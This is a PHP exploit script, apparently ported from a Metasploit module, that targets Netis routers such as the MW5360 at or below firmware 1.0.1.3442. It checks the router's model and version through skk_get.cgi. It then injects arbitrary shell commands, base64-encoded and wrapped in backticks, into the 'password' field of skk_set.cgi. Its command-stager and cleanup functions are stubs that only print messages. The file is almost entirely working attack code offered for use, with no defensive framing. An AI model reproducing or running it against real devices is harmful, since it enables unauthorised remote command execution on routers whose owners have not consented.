<?php
class NetisRouterExploit {
    private $targetUri;
    private $cmdDelay;

    public function __construct($targetUri = '/', $cmdDelay = 30) {
        $this->targetUri = $targetUri;
        $this->cmdDelay = $cmdDelay;
    }

    public function executeCommand($cmd) {
        if (strpos($cmd, 'chmod +x') !== false) {
            $this->registerFilesForCleanup(trim(explode('+x', $cmd)[1]));
        }

        if (strpos($cmd, 'rm -f') === false) {
            $payload = base64_encode("`$cmd`");
            echo "Executing $cmd\n";
            $this->sendRequest('/cgi-bin/skk_set.cgi', [
                'password' => $payload,
                'quick_set' => 'ap',
                'app' => 'wan_set_shortcut'
            ]);
        }
    }

    public function check() {
        echo "Checking if target can be exploited.\n";
        $res = $this->sendRequest('/cgi-bin/skk_get.cgi', [
            'mode_name' => 'skk_get',
            'wl_link' => 0
        ]);

        if ($res === false || strpos($res['body'], 'version') === false) {
            return "Unknown: No valid response received from target.";
        }

        preg_match('/.?(version).?\s*:\s*.?((\\|[^,])*)/', $res['body'], $matches);
        if (isset($matches[2])) {
            $version_number = strtoupper(trim(explode('-V', $matches[2])[1]));
            $model_number = strtoupper(trim(explode('-V', $matches[2])[0]));

            if (strpos($model_number, '-') !== false) {
                $model_number = trim(explode('-', $model_number)[1]);
            } else {
                $model_number = trim(explode('(', $model_number)[1]);
            }

            if ($model_number == 'MW5360' && version_compare($version_number, '1.0.1.3442', '<=')) {
                return "Appears: Version " . $matches[2];
            }

            return "Safe: Version " . $matches[2];
        }

        return "Safe";
    }

    public function exploit() {
        echo "Executing exploit with payload.\n";
        $this->executeCmdStager(['noconcat' => true, 'delay' => $this->cmdDelay]);
    }

    private function sendRequest($uri, $postData) {
        $url = "http://your_target_ip" . $this->targetUri . $uri;
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($postData),
            ],
        ];
        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            return false;
        }

        return ['body' => $result];
    }

    private function registerFilesForCleanup($filename) {
        echo "Registering $filename for cleanup.\n";
    }

    private function executeCmdStager($options) {
        echo "Executing command stager with options: " . print_r($options, true) . "\n";
    }
}

$exploit = new NetisRouterExploit('/');
$exploit->check();
$exploit->exploit();

